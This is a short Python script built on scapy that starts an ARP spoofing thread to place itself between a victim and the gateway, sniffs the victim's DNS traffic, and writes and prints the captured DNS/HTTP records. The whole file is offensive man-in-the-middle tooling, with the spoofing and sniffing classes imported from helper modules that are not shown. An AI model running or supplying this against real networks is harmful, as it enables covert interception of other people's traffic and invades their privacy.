#!/usr/bin/python

from scapy.all import *
from utils.network import *
from utils.tools import *
import socket, struct
import argparse
import sys
from threading import *


thread_list = []

address = preset_arp_spoofing(True)
th_spoofer = Spoofer(address[0], address[1], address[2], address[3])
th_spoofer.start()

th_sniffer= Sniffer(address[3],"dns")
thread_list.append(th_sniffer)
th_sniffer.start()

th_sniffer.join()
th_spoofer.stop()
dns_get_parser("dns_http_sniffed.txt","dns_http_sniffed_proper.txt")
print(colors.CLEAR)
print_file("dns_http_sniffed_proper.txt")
